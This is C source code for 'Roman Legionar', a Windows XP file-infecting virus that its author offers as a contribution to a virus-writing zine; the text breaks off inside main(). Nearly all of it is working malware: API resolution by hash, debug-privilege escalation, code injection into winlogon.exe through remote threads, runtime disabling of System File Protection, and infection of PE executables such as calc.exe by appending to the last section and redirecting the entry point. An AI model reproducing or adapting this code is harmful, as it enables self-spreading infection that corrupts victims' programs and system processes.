//-----------------------------------------------------------------------------
// WinXP.Roman Legionar 32-bit by tanMa                 (bad english documented)
//
// Welcome to the source code of Roman Legionar,  this is my first virii and it
// is a demo,  so don't blame me. It was written back in early 2003. and it was
// 95% done. But from some reason I didnt finish it, and didnt show it's source
// code and didnt make contribution to vx community! Now three years and a half
// beyond in 2006., something resounds in my mind. I decided to finish this  5%
// and make small step for the community but big one for my-self. This virii is
// designed as  contribution to  the 29a Zine and I have hope it will fit in...
// Virus it-self is  entirely  written  in C ( BCC32 ). It  can not  rival with
// viruses  written in ASM, but can serride  with others of HLL kind. As far as
// i know  Roman Legionar  is the first  HLL  virii which targets  Win32 PE not
// altering  host's import section and  depends not on  host's  export section. 
// Other stuffs this demo virii can do are usual... This is 32-bit version made
// for Win32 but can easly be ported to Win64...
// 
//  Virus properties:
//      Name: Roman Legionar
//  Coded in: C Language
//  Platform: WinXP 32-bit (tested on SP2)
//   Infects: .EXE PE32-bit (last section increase)
//   Crypted: YES (virus .code, through the reloc,no need decryptor!)
//   PayLoad: YES (not a destructive one)
// Spreading: NO (this is a demo :) )
//
// This demo virus does:
//
// 1st generation:
// Infect victim.exe in current directory
//
// 2nd generation:
// Insert it-self into winlogon.exe
// Disable SFP (run-time)
// Infect calc.exe in windows system directory
// Hook api (go to main menu and see about box...)
//
//
//                                                              coded by tanMa
//                                                                 Serbia 2006.
//                                                            demonyu@yahoo.com
//
//                                                     Documentation:Vx-tasy #1
//                                                     Zines 5...7. by 29a Labs
//-----------------------------------------------------------------------------
#include "RL32.h"
//-----------------------------------------------------------------------------
//
//
//-----------------------------------------------------------------------------
void *memset(void *dst, int val, size_t count)
{
	char *temp;

	for (temp = (char *)dst; count != 0; count--)
		*temp++ = val;
	return dst;
}
//-----------------------------------------------------------------------------
void *memcpy(void *dst_ptr, const void *src_ptr, size_t count)
{
void *ret_val = dst_ptr;
const char *Src = (const char *)src_ptr;
char *Dst = (char *)dst_ptr;

	for (; count != 0; count--)
		*Dst++ = *Src++;
return ret_val;
}
//-----------------------------------------------------------------------------
int memcmp(const void *memptr1, const void *memptr2, size_t count)
{
const unsigned char *mem1 = (const unsigned char *)memptr1;
const unsigned char *mem2 = (const unsigned char *)memptr2;

	for (; count != 0; count--)
	{
		if (*mem1 != *mem2)
			return *mem1 -  *mem2;
		mem1++;
		mem2++;
	}

return 0;
}
//-----------------------------------------------------------------------------
//
//
//-----------------------------------------------------------------------------
size_t strlen(const char *str)
{
size_t ret_val;

	for (ret_val = 0; *str != '\0'; str++)
		ret_val++;

return ret_val;
}
//-----------------------------------------------------------------------------
int strcmp(const char *str1, const char *str2)
{
	while ((*str2 != '\0') && (*str1 == *str2))
	{
		str1++;
		str2++;
	}

return *str1-*str2;
}
//-----------------------------------------------------------------------------
char *strcpy(char *dst, const char *src)
{
	char *ret_val = dst;

	while (*src != '\0')
		*dst++ = *src++;
	*dst = *src;
	return ret_val;
}
//-----------------------------------------------------------------------------
//
//
//-----------------------------------------------------------------------------
unsigned long UpdateCRC32( char val, unsigned long crc )
{
  return CRC32Table[(unsigned char)crc^val] ^ (crc>>8);
}
//-taken-from-GriYo-----------------------------------------------------------
unsigned long strcrc32( char *ptr, int size, unsigned long crc )
{
	while( size-- )  crc = UpdateCRC32( *ptr++, crc );
return crc;
}
//-----------------------------------------------------------------------------
// Return crc32 of string
//-----------------------------------------------------------------------------
unsigned long Str2CRC32(char *str)
{
	return strcrc32( str, strlen(str), 0);
}

//-----------------------------------------------------------------------------
//
//-----------------------------------------------------------------------------
HMODULE GetKernel32Base(void)
{
	//find kernel32 address using PEB, little of inline asm
	//...inline asm is part of C Language :)
	asm
	{
	 mov	eax, fs:[30h]
	 mov	eax, [eax + 0ch]
	 mov	esi, [eax + 1ch]
	 lodsd
	 mov	ebx, [eax + 08h]
	}

return (HMODULE)_EBX;		//XP-SP2 Hard coded 2088763392
}
//-----------------------------------------------------------------------------
//
//-----------------------------------------------------------------------------
FARPROC GetProcAddressCRC32(HMODULE hModule,DWORD ApiNameCRC32)
{
IMAGE_DOS_HEADER *lpModuleMZ;
IMAGE_NT_HEADERS *lpModulePE;
IMAGE_EXPORT_DIRECTORY *lpModuleExp;
DWORD *AddressOfNames;
 WORD *AddressOfNameOrdinals;
DWORD *AddressOfFunctions;
char *Name;
FARPROC Address;		//adresa funkcije
DWORD index;

if (hModule!=NULL)
{
	lpModuleMZ=(IMAGE_DOS_HEADER *)hModule;
	lpModulePE=(IMAGE_NT_HEADERS *)((DWORD)lpModuleMZ+lpModuleMZ->e_lfanew);
	lpModuleExp=(IMAGE_EXPORT_DIRECTORY*) ((DWORD)lpModuleMZ+lpModulePE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	AddressOfNames=(DWORD*)((DWORD)lpModuleMZ+lpModuleExp->AddressOfNames);
	AddressOfNameOrdinals=(WORD*)((DWORD)lpModuleMZ+lpModuleExp->AddressOfNameOrdinals);
	AddressOfFunctions=(DWORD*)((DWORD)lpModuleMZ+lpModuleExp->AddressOfFunctions);

	for (index=0;index<lpModuleExp->NumberOfNames;index++)
	{
		Name=(char*)((DWORD)lpModuleMZ+AddressOfNames[index]);
		if (Str2CRC32(Name)==ApiNameCRC32) 
		{	
			index=AddressOfNameOrdinals[index];	//new index
			Address=(FARPROC)((DWORD)lpModuleMZ+AddressOfFunctions[index]);
			return Address;
		}

	}
}

return NULL;
}
//-----------------------------------------------------------------------------
//
//-----------------------------------------------------------------------------
BOOL RetriveDLLApis(HMODULE hMod,DWORD ApiNamesCRC32[],LPDWORD Addresses,int numofapis)
{
int i;
	//walk through array of CRC32
	for (i=0;i<numofapis;i++)
	{
		//Get api address
		if (NULL==(Addresses[i]=(DWORD)GetProcAddressCRC32(hMod,ApiNamesCRC32[i])))
		{
			return FALSE;
                }
	}

return TRUE;
}

//-----------------------------------------------------------------------------
//
//------------------------------------------------------------------------------
BOOL Open_File(OPENED_FILE_DATA *ofd,char *fName)
{
	ofd->fHandle=ofd->fMapHandle=ofd->lpBaseOfFile=NULL;

	//open file
        if (INVALID_HANDLE_VALUE==(ofd->fHandle=(HANDLE)aCreateFileA(fName,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ,
                        NULL,
                        OPEN_EXISTING,
                        0,
                        NULL))) {

                DBGERR("CreateFile FAILED!!!")
		return FALSE;
        }

        //save file size
        ofd->FileSizeOnOpen=aGetFileSize(ofd->fHandle,NULL);

return TRUE;
}
//-----------------------------------------------------------------------------
//
//-----------------------------------------------------------------------------
BOOL Map_File(OPENED_FILE_DATA *ofd,DWORD BytesToMap)
{
DWORD b2map;

	if (ofd->fHandle==NULL)
		return FALSE;

	if (BytesToMap==0)
		b2map=ofd->FileSizeOnOpen;
	else
		b2map=BytesToMap;
	

        if (NULL==(ofd->fMapHandle=(HANDLE)aCreateFileMappingA(ofd->fHandle,
                        NULL,
                        PAGE_READWRITE,
                        0,
                        b2map,
                        NULL))) {

                DBGERR("CreateFileMapping FAILED!")
		return FALSE;
	}

	if (NULL==(ofd->lpBaseOfFile=(LPVOID)aMapViewOfFile(ofd->fMapHandle,FILE_MAP_ALL_ACCESS,0,0,b2map))) {
                DBGERR("MapViewOfFile FAILED!")
		return FALSE;
	}

return TRUE;
}
//-----------------------------------------------------------------------------
//
//------------------------------------------------------------------------------
void UnMap_File(OPENED_FILE_DATA *ofd)
{
	if (ofd->lpBaseOfFile!=NULL) {
		aUnmapViewOfFile(ofd->lpBaseOfFile);
        	ofd->lpBaseOfFile=NULL;
	}

	if (ofd->fMapHandle!=NULL) {
		aCloseHandle(ofd->fMapHandle);
		ofd->fMapHandle=NULL;
	}

return;
}
//-----------------------------------------------------------------------------
//
//------------------------------------------------------------------------------
void Close_File(OPENED_FILE_DATA *ofd)
{
	if (ofd->fHandle!=NULL) {
		aCloseHandle(ofd->fHandle);
		ofd->fHandle=NULL;
	}
return;
}
//-----------------------------------------------------------------------------
// Set Debug privilege for current process
//------------------------------------------------------------------------------
BOOL SetDebugPrivilege(void)
{
HANDLE           hProcess;
HANDLE           hAccessToken;
LUID             luidPrivilegeLUID;
TOKEN_PRIVILEGES tpTokenPrivilege;

	hProcess = (HANDLE)aGetCurrentProcess();
	if (!hProcess)
	{ 
		DBGERR("GetCurrentProcess-FAILD!")
		return FALSE;
	}

	if (!aOpenProcessToken(hProcess,TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hAccessToken))
	{
		DBGERR("OpenProcessToken-FAILD")
		return FALSE;
	}

	//Get LUID of SeSecurityPrivilege privilege
	if (!aLookupPrivilegeValueA(NULL,"SeDebugPrivilege",&luidPrivilegeLUID))
	{
		DBGERR("LookupPrivilegeValue - must be logged as Administrator")
		return FALSE;
	}

	// Enable the SeSecurityPrivilege privilege using the LUID just
	// obtained

	tpTokenPrivilege.PrivilegeCount = 1;
	tpTokenPrivilege.Privileges[0].Luid = luidPrivilegeLUID;
	tpTokenPrivilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	aAdjustTokenPrivileges (hAccessToken,
                         FALSE,  // Do not disable all
                         &tpTokenPrivilege,
                         sizeof(TOKEN_PRIVILEGES),
                         NULL,   // Ignore previous info
                         NULL);  // Ignore previous info

	if ( aGetLastError() != NO_ERROR )
	{
		DBGERR("AdjustTokenPrivileges-FAILD!!!")
		return FALSE;
	}

return TRUE;
}

//----------------------------------------------------------------------------
// Open process (so we can write in address space of target process)
// for some processes (winlogon.exe etc.) debuger previlege needed...
//----------------------------------------------------------------------------
HANDLE OpenProcess_Module(char *lpMainModuleName)
{
DWORD bytesneeded;
DWORD ProcessIdList[0x80];		//up to 32 processes
DWORD ProcessesNum;
DWORD i;

HMODULE ModuleList;
char ModuleName[MAX_PATH];

        aEnumProcesses((DWORD*)ProcessIdList,0x80,&bytesneeded);
        ProcessesNum=bytesneeded/0x04;

	//walk through Processes
        for (i=0;i<ProcessesNum;i++)
        {
                HANDLE hOP=(HANDLE)aOpenProcess(0x43A,FALSE,ProcessIdList[i]);
                if (hOP!=NULL)
                {
                        //enumerate only first module in target process
                        aEnumProcessModules(hOP,&ModuleList,4,&bytesneeded);

			//get module name
                        aGetModuleBaseNameA(hOP,ModuleList,ModuleName,MAX_PATH);
			//is it module that we are looking for?
			if (0==strcmp(ModuleName,lpMainModuleName))
			{
				return hOP;
			}

                }
		aCloseHandle(hOP);
        }

return NULL;
}
//-----------------------------------------------------------------------------
//
//-----------------------------------------------------------------------------
BOOL ApplyReloc(HANDLE hProcess,LPVOID lpCodeToReloc,LPVOID lpRelocSection,long Dislocation)
{
IMAGE_BASE_RELOCATION *RelocBlock;
IMAGE_RELOCATION_DATA *PtrReloc,*PtrRelocTemp;

DWORD NumOfRelocs=0;	//number of relocations in one RELOC BLOCK inside of "viurs .reloc section"


DWORD offset;		//offset (in virus .code section) where to apply relocation
long value_at_offset;
long new_value;
DWORD i;
DWORD oldprotection;


        RelocBlock=(IMAGE_BASE_RELOCATION *)(lpRelocSection);

	//walk through all RELOC BLOKCs
	while (RelocBlock->VirtualAddress!=0)
	{

		//inside of RELOC BLOCK
		PtrReloc=  (IMAGE_RELOCATION_DATA *)((LPBYTE)RelocBlock+sizeof(IMAGE_BASE_RELOCATION));
		NumOfRelocs=(RelocBlock->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(IMAGE_RELOCATION_DATA);
		PtrRelocTemp=PtrReloc;

		for (i=0;i<NumOfRelocs;i++)
        	{
	        	if (PtrRelocTemp->RelocType == IMAGE_REL_BASED_HIGHLOW)
	                {
	                        offset=(DWORD)((DWORD)lpCodeToReloc-dwVirusCodeRVA1Gen+RelocBlock->VirtualAddress+PtrRelocTemp->RelocOfs);

				//read value at "offset" and place into "value_at_offset"
				if (!aReadProcessMemory(hProcess,(LPVOID)offset,&value_at_offset,4,NULL))
				{
					DBGERR("aReadProcessMemory FAILED !!!")
					return FALSE;
				}

				//Calculate relocations
		                new_value=value_at_offset+Dislocation;
        
				//unprotect (set new protection READ&WRITE) memory at "offset"
				if (!aVirtualProtectEx(hProcess,(LPVOID)offset,4,PAGE_READWRITE,&oldprotection))
				{
					DBGERR("VirtualProcetEx FAILED!!! Could not unprotect (at 'offset')!!!")
					return FALSE;
			        }

				//write "new_value" at "offset" (relocate)
				if (!aWriteProcessMemory(hProcess,(LPVOID)offset,&new_value,4,NULL))
                	        {
					DBGERR("aWriteProcessMemory FAILED! Could not write 'new_value' at 'offset'!!!")
					return FALSE;
                	        }

				//protect (return protection as it was) memory at "offset"
				if (!aVirtualProtectEx(hProcess,(LPVOID)offset,4,oldprotection,&oldprotection))
				{
					DBGERR("VirtualProcetEx FAILED!!! Could not restore protection (at 'offset')!!!")
					return FALSE;
			        }

			}

	        PtrRelocTemp++; 
		} // next reloc inside of RELOC BLOCK

		RelocBlock=(IMAGE_BASE_RELOCATION *)((LPBYTE)RelocBlock+RelocBlock->SizeOfBlock);
	} // next RELOC BLOCK inside of "virus .reloc section"

return TRUE;
}
//------------------------------------------------------------------------------
// Insert virus into remote process
//------------------------------------------------------------------------------
HANDLE InsertVirusIntoProcess(char *lpProcessMainModuleName,DWORD EP,DWORD cflag)
{
HANDLE hTargetProcess;
LPVOID VirusAddrInTargetProcess;	//address of virus in target process
HANDLE hRemoteThread=NULL;
DWORD s;
LPVOID lpNewDataSection;		//address of virus .data section in target process

	//find process
	if (NULL==(hTargetProcess=OpenProcess_Module(lpProcessMainModuleName)))
	{
		DBGERR("OpenProcess_Module FAILED!")
		return NULL;
        }

        //Allocate memory in target process
	if(NULL==(VirusAddrInTargetProcess=(LPVOID)aVirtualAllocEx(hTargetProcess,NULL,VirusLen,MEM_RESERVE | MEM_COMMIT,PAGE_EXECUTE_READWRITE)))
	{
        	DBGERR("VirtualAllocEx FAILED!!! Could not allocate memory in target process!")
		return NULL;
	}

	//Dump virus into target process...
	if (!aWriteProcessMemory(hTargetProcess,VirusAddrInTargetProcess,(LPVOID)(dwVirusCodeRVA+dwVirusImageBase),VirusLen,NULL))
	{
        	DBGERR("WriteProcessMemory FAILED!!! Could not dump virus into target process!")
		return NULL;
	}

	//Relocate virus (code) in target process
	ApplyReloc(hTargetProcess,VirusAddrInTargetProcess,
	(LPVOID)(dwVirusImageBase+dwVirusRelocRVA),
	(DWORD)VirusAddrInTargetProcess-(dwVirusImageBase+dwVirusCodeRVA));

	//virus .data section in target process
	lpNewDataSection=(LPVOID)((DWORD)VirusAddrInTargetProcess+dwVirusDataRVA1Gen-dwVirusCodeRVA1Gen);

	//set vars
	SetDWORDVarValue((DWORD)&dwVirusImageBase,(DWORD)VirusAddrInTargetProcess,lpNewDataSection,hTargetProcess);
	SetDWORDVarValue((DWORD)&dwVirusCodeRVA,0,lpNewDataSection,hTargetProcess);
	SetDWORDVarValue((DWORD)&dwVirusDataRVA,dwVirusDataRVA1Gen-dwVirusCodeRVA1Gen,lpNewDataSection,hTargetProcess);
	SetDWORDVarValue((DWORD)&dwVirusRelocRVA,dwVirusRelocRVA1Gen-dwVirusCodeRVA1Gen,lpNewDataSection,hTargetProcess);

	//Create Remote thread (in target process)...
	if (NULL==(hRemoteThread=(HANDLE)aCreateRemoteThread(hTargetProcess,0,0,(LPVOID)((DWORD)VirusAddrInTargetProcess+EP-dwVirusImageBase-dwVirusCodeRVA),0,cflag,0)))
	{
        	DBGERR("CreateRemoteThread - FAILED!!! Could not create remote thread in target process!")
		return NULL;
	}


	//close target process
	aCloseHandle(hTargetProcess);

return hRemoteThread;
}
//-----------------------------------------------------------------------------
//Hook API in current process
//To hook api in remote process,just inject there and call this function
//Can not hook api imported by ordinal!
//-----------------------------------------------------------------------------
BOOL HookAPI(HMODULE lpModuleBase,char *lpApiName,FARPROC NewAdr)
{
IMAGE_DOS_HEADER *lpDosHeader = NULL;
IMAGE_NT_HEADERS *lpPeHeader = NULL;
IMAGE_IMPORT_DESCRIPTOR *Imports=NULL;		//import section for "lpModuleBase"
DWORD *FunctionName;
DWORD *FunctionAddr;
char *pName;

int ImportedDLLs=0;
int i;

DWORD oldprotection;

        lpDosHeader=(IMAGE_DOS_HEADER *)(lpModuleBase);
        lpPeHeader=(IMAGE_NT_HEADERS *)((BYTE*)lpDosHeader+lpDosHeader->e_lfanew);
	Imports = (IMAGE_IMPORT_DESCRIPTOR *)((DWORD)lpModuleBase + lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);


	//count imported .DLLs by module
	while (Imports->OriginalFirstThunk)
	{
		ImportedDLLs++;
		Imports++;
	}
	Imports = (IMAGE_IMPORT_DESCRIPTOR *)((DWORD)lpModuleBase + lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	//walk through all modules
	for (i=0; i<ImportedDLLs; i++)
	{
  	     	FunctionName = (DWORD *)(Imports->OriginalFirstThunk + (DWORD)lpDosHeader);
	        FunctionAddr = (DWORD *)(Imports->FirstThunk + (DWORD)lpDosHeader);

		//walk though function names till NULL
		while (*FunctionName)
		{
			//is it ordinal?
			if (*FunctionName & IMAGE_ORDINAL_FLAG)
			{
				return FALSE;
			}
			else
			{
				pName = (LPCTSTR)((DWORD)lpDosHeader + *FunctionName + 2/*Hint*/);

				//is it function,we are looking for?
				if (0==strcmp(pName,lpApiName))
				{

					//un-protect memory
					if (!aVirtualProtect((LPVOID)FunctionAddr,4,PAGE_READWRITE,&oldprotection))
					{
						DBGERR("VirtualProtect FAILED!!! Could not un-protect!")
						return FALSE;
			        	}

					//hook
					*FunctionAddr=NewAdr;

					//restore memory protection
					if (!aVirtualProtect((LPVOID)FunctionAddr,4,oldprotection,&oldprotection))
					{
						DBGERR("VirtualProtect FAILED! Could not restore protection!")
			        	}

					return TRUE;
				}


			}
		FunctionName++;
		FunctionAddr++;
		} //next func.


	Imports++;	//next imported module (.DLL)
	}

return FALSE;
}
//-------------------------------------------------------------------------------
// Infect PE32-bit Executable,method last section increase
// Does not check for PE32+ so it may corrupt them
// There are other stuffs like (Self-Extractors,CheckSum,Victim's date&time,re-infecting)
// but it's not a point of this demo virii...
//------------------------------------------------------------------------------
BOOL InfectFile(char *fName)
{
OPENED_FILE_DATA ofd;
IMAGE_DOS_HEADER *lpVictimDosHeader = NULL;
IMAGE_NT_HEADERS *lpVictimPeHeader = NULL;

IMAGE_SECTION_HEADER *lpVictimFirstSectionHdr = NULL;
IMAGE_SECTION_HEADER *lpVictimLastSectionHdr = NULL;
DWORD NewVictimFileSize;
DWORD VictimLastSectionSize;
LPVOID lpNewDataSection;
long t;

	//open victim
	if (!Open_File(&ofd,fName))
	{
		DBGERR("Open_File FAILED!!! Could not open victim!")
		return FALSE;
	}

	//map
	if (!Map_File(&ofd,0))
	{
		DBGERR("Map_File FAILED!!! Could not perform mapping!!!")
		Close_File(&ofd);
		return FALSE;
	}

	//victim's headers
        lpVictimDosHeader=(IMAGE_DOS_HEADER *)ofd.lpBaseOfFile;
        lpVictimPeHeader=(IMAGE_NT_HEADERS *)((BYTE*)lpVictimDosHeader+lpVictimDosHeader->e_lfanew);

        lpVictimFirstSectionHdr=(IMAGE_SECTION_HEADER *)((long)lpVictimPeHeader+sizeof(IMAGE_NT_HEADERS));
        lpVictimLastSectionHdr=lpVictimFirstSectionHdr+lpVictimPeHeader->FileHeader.NumberOfSections-1;

	//some checks
	if (lpVictimPeHeader->OptionalHeader.CheckSum!=0)
	{
		DBGERR("CheckVictim - CheckSum,but can continue...")
		//UnMap_File(&ofd);
		//Close_File(&ofd);
		//return FALSE;	
	}	


	//start of infection
	//increase size of victim so virus can be added...
        NewVictimFileSize=ofd.FileSizeOnOpen+VirusLen+0x1000;

	UnMap_File(&ofd);                       //un-map
	if (!Map_File(&ofd,NewVictimFileSize))	//map again with new size
	{
		DBGERR("Map_File FAILED!!! Remap of victim failed!")
		Close_File(&ofd);
		return FALSE;
	}

	//re-init pointers (headers) because of victim re-mapping 
        lpVictimDosHeader=(IMAGE_DOS_HEADER *)ofd.lpBaseOfFile;
        lpVictimPeHeader=(IMAGE_NT_HEADERS *)((BYTE*)lpVictimDosHeader+lpVictimDosHeader->e_lfanew);

        lpVictimFirstSectionHdr=(IMAGE_SECTION_HEADER *)((long)lpVictimPeHeader+sizeof(IMAGE_NT_HEADERS));
        lpVictimLastSectionHdr=lpVictimFirstSectionHdr+lpVictimPeHeader->FileHeader.NumberOfSections-1;

	//Change attributes of last section's header
	//set new flags
	lpVictimLastSectionHdr->Characteristics|=0x0A0000020; //code,writable&executable

	//VirtualSize
	VictimLastSectionSize=lpVictimLastSectionHdr->Misc.VirtualSize;
	lpVictimLastSectionHdr->Misc.VirtualSize+=VirusLen;

	//SizeOfRawData=VirtualSize aligned (file alignment)
        t=lpVictimLastSectionHdr->Misc.VirtualSize;
        t=t/lpVictimPeHeader->OptionalHeader.FileAlignment;
        t++;
        t=t*lpVictimPeHeader->OptionalHeader.FileAlignment;
        lpVictimLastSectionHdr->SizeOfRawData=t;


        //PE Header of victim-SizeOfImage
        lpVictimPeHeader->OptionalHeader.SizeOfImage=lpVictimLastSectionHdr->VirtualAddress+lpVictimLastSectionHdr->Misc.VirtualSize;

	//dump virus (code,data,reloc) at end of last section's body of victim
	memcpy((LPVOID)((DWORD)ofd.lpBaseOfFile+lpVictimLastSectionHdr->PointerToRawData+VictimLastSectionSize),
		(LPVOID)(dwVirusCodeRVA+dwVirusImageBase),VirusLen);

	//relocate virus (.code) (in victim)
	ApplyReloc((HANDLE) aGetCurrentProcess(),
	(LPVOID)((DWORD)ofd.lpBaseOfFile+lpVictimLastSectionHdr->PointerToRawData+VictimLastSectionSize),
	(LPVOID)((DWORD)ofd.lpBaseOfFile+lpVictimLastSectionHdr->PointerToRawData+VictimLastSectionSize+dwVirusRelocRVA-dwVirusCodeRVA),
	lpVictimLastSectionHdr->VirtualAddress+VictimLastSectionSize-dwVirusCodeRVA+(lpVictimPeHeader->OptionalHeader.ImageBase-dwVirusImageBase));


	//In victim "virus .data section"
	lpNewDataSection=(LPVOID)((DWORD)ofd.lpBaseOfFile+lpVictimLastSectionHdr->PointerToRawData+VictimLastSectionSize+dwVirusDataRVA1Gen-dwVirusCodeRVA1Gen);

	//set vars in next generation
	SetDWORDVarValue((DWORD)&dwVirusImageBase,lpVictimPeHeader->OptionalHeader.ImageBase,lpNewDataSection,(HANDLE)aGetCurrentProcess());
	SetDWORDVarValue((DWORD)&dwVirusCodeRVA  ,lpVictimLastSectionHdr->VirtualAddress+VictimLastSectionSize,lpNewDataSection,(HANDLE)aGetCurrentProcess());
	SetDWORDVarValue((DWORD)&dwVirusDataRVA  ,lpVictimLastSectionHdr->VirtualAddress+VictimLastSectionSize+dwVirusDataRVA1Gen-dwVirusCodeRVA1Gen,lpNewDataSection,(HANDLE)aGetCurrentProcess());
	SetDWORDVarValue((DWORD)&dwVirusRelocRVA  ,lpVictimLastSectionHdr->VirtualAddress+VictimLastSectionSize+dwVirusRelocRVA1Gen-dwVirusCodeRVA1Gen,lpNewDataSection,(HANDLE)aGetCurrentProcess());

	//Host Entry Point
	SetDWORDVarValue((DWORD)&HostEP,lpVictimPeHeader->OptionalHeader.ImageBase+lpVictimPeHeader->OptionalHeader.AddressOfEntryPoint,lpNewDataSection,(HANDLE)aGetCurrentProcess());

	//Increase generation
	SetDWORDVarValue((DWORD)&dwGeneration,dwGeneration+1,lpNewDataSection,(HANDLE)aGetCurrentProcess());

	//and finally Entry-Point set to points at virii code section
	lpVictimPeHeader->OptionalHeader.AddressOfEntryPoint=lpVictimLastSectionHdr->VirtualAddress+VictimLastSectionSize;

	//close victim
	UnMap_File(&ofd); Close_File(&ofd);

return TRUE;
}
//------------------------------------------------------------------------------
//
//------------------------------------------------------------------------------
void SetDWORDVarValue(DWORD VarAdr,DWORD NewVal,LPVOID lpNewDataSection,HANDLE hProcess)
{
	VarAdr=VarAdr-dwVirusImageBase-dwVirusDataRVA;  //RVA
	if (!aWriteProcessMemory(hProcess,(LPVOID)((DWORD)lpNewDataSection+VarAdr),&NewVal,4,NULL))
	{
        	DBGERR("WriteProcessMemory FAILED! Setting 'NewVal' at 'hProcess::VarAdr' FAILED!")
		return;
	}	

return;
}
//-----------------------------------------------------------------------------
// Initialize needed DLLs and their api addresses
//-----------------------------------------------------------------------------
BOOL InitDLLs(void)
{
	//Get KERNEL32.DLL address
	Kernel32Addr=GetKernel32Base();

	//Retrive Kernel32.dll's apis
	if (!RetriveDLLApis(Kernel32Addr,Kernel32ApisCRC32,(LPDWORD)&aBeep,Kernel32ApiNum))
	{
		return FALSE;
        }

	//little patch (i do not know why my getproc does not work for this one???)
	aGetLastError=(FARPROC) aGetProcAddress(Kernel32Addr,"GetLastError");

	//Load USER32.DLL
	if ((HMODULE)NULL == (User32Addr=aLoadLibraryA("user32.dll")) )
	{
		return FALSE;
	}
	
	//Retrive User32.dll's apis
	if (!RetriveDLLApis(User32Addr,User32ApisCRC32,(LPDWORD)&aMessageBoxA,User32ApiNum))
	{
		return FALSE;
        }
	//from now,we can use DBGERR macro (to display error box (virus interal
	//errors)

	//Load ADVAPI32.DLL
	if ((HMODULE)NULL == (AdvApi32Addr=aLoadLibraryA("advapi32.dll")) )
	{
		DBGERR("Could not load advapi32.dll!!!")
		return FALSE;
	}

	//Retrive AdvApi32.dll's apis
	if (!RetriveDLLApis(AdvApi32Addr,AdvApi32ApisCRC32,(LPDWORD)&aOpenProcessToken,AdvApi32ApiNum))
	{
		DBGERR("Could not obtain apis form advapi32.dll !!!")
		return FALSE;
	}


	//Load PSAPI.DLL
	if ((HMODULE)NULL==(PSAPIAddr=(HMODULE)aLoadLibraryA("PSAPI.DLL")))
	{
		DBGERR("Could not load PSAPI.DLL !!!")
		return FALSE;
	}

	//Retrive PSAPI.DLL's apis
	if (!RetriveDLLApis(PSAPIAddr,PSAPIApisCRC32,(LPDWORD)&aEnumProcesses,PSAPIApiNum))
	{
		DBGERR("Could not obtain apis form PSAPI.dll !!!")
		return FALSE;
        }	


return TRUE;
}
//-----------------------------------------------------------------------------
// Called in 1st generation only
//------------------------------------------------------------------------------
void Init1Gen(void)
{
IMAGE_DOS_HEADER *lpDosHeader = NULL;
IMAGE_NT_HEADERS *lpPeHeader = NULL;

IMAGE_SECTION_HEADER *lpCodeSectionHdr = NULL;
IMAGE_SECTION_HEADER *lpDataSectionHdr = NULL;
IMAGE_SECTION_HEADER *lpRelocSectionHdr = NULL;

        lpDosHeader=(IMAGE_DOS_HEADER *)(VirusImageBase1Gen);
        lpPeHeader=(IMAGE_NT_HEADERS *)((BYTE*)lpDosHeader+lpDosHeader->e_lfanew);

        lpCodeSectionHdr=(IMAGE_SECTION_HEADER *)((long)lpPeHeader+sizeof(IMAGE_NT_HEADERS));
	lpDataSectionHdr=lpCodeSectionHdr+1;
	lpRelocSectionHdr=lpCodeSectionHdr+2;

	dwVirusCodeRVA1Gen=lpCodeSectionHdr->VirtualAddress;
	dwVirusDataRVA1Gen=lpDataSectionHdr->VirtualAddress;
	dwVirusRelocRVA1Gen=lpRelocSectionHdr->VirtualAddress;

	dwVirusCodeSize=lpCodeSectionHdr->Misc.VirtualSize;
	dwVirusDataSize=lpDataSectionHdr->Misc.VirtualSize;
	dwVirusRelocSize=lpRelocSectionHdr->Misc.VirtualSize;

	dwVirusImageBase=VirusImageBase1Gen;
	dwVirusCodeRVA=dwVirusCodeRVA1Gen;
	dwVirusDataRVA=dwVirusDataRVA1Gen;
	dwVirusRelocRVA=dwVirusRelocRVA1Gen;

return;
}
//-----------------------------------------------------------------------------
#ifdef VDEBUG
 void  _my_dbg_error_msg(int nErrCode, char *sErrMsg,char *sFile, char* sFunc, int nLine)
 {
	char err[512];
	awsprintfA(err, "Error: %s\n Return code: %d\n Modul: %s\n Function: %s\n Line: %d", sErrMsg, nErrCode, sFile, sFunc, nLine);
	aMessageBoxA(NULL,err,"Error Message",MB_OK|MB_ICONERROR);
 return;
 }
#endif

//-----------------------------------------------------------------------------
// This is Virus Entry Point (for target process)
// "Inserter" pass control here
//-----------------------------------------------------------------------------
void Intruder(void)
{
//char sModuleName[15];
char sSystemDirPath[MAX_PATH];
char sPathToVictim[MAX_PATH];
char sMsg[256];

HMODULE sfcAddr;
FARPROC asfc_terminate;

	//Init kernel32.dll,user32.dll....
	if (!InitDLLs())
		return;

	//aGetModuleBaseNameA(aGetCurrentProcess(),aGetModuleHandleA(NULL),&ModuleName,15);
	//awsprintfA(sMsg,"Hello world from %s !!!",ModuleName);

	//SFP run-time disabling inspired by Rattar
	if (NULL== (sfcAddr=(HMODULE)aLoadLibraryA("sfc.dll")) )
	{
		DBGERR("aLoadLibraryA FAILED! Could not load sfc.dll!")
		return;
	}

	//Find by ordinal (undocumented function exproted by sfc.dll)
	asfc_terminate=aGetProcAddress(sfcAddr, (char *) 2);

	//till next Windows restart no SFP :)
	asfc_terminate();


	//composite path&name to calc.exe
	aGetSystemDirectoryA(sSystemDirPath,MAX_PATH);
	awsprintfA(sPathToVictim,"%s%s",sSystemDirPath,"\\calc.exe");

	//make it infected
	if (!InfectFile(sPathToVictim))
	{
		DBGERR("Infect File FAILED!!!")
	}


return;
}
//-----------------------------------------------------------------------------
int NewShellAboutW(HWND hWnd,LPCTSTR szApp,LPCTSTR szOtherStuff,HICON hIcon)
{
	aMessageBoxA(NULL,"You have been infected by Roman Legionar!\nPress OK to continue...","WinXP.Roman Legionar by tanMa",MB_OK);

return TRUE;
}
//-----------------------------------------------------------------------------
// Virus Entry Point
//-----------------------------------------------------------------------------
void main(void)
{
FARPROC b;
	//first, Generation?
	if (dwGeneration==1)
		Init1Gen();

	//Init kernel32.dll,user32.dll....
	InitDLLs();


	//1st generation
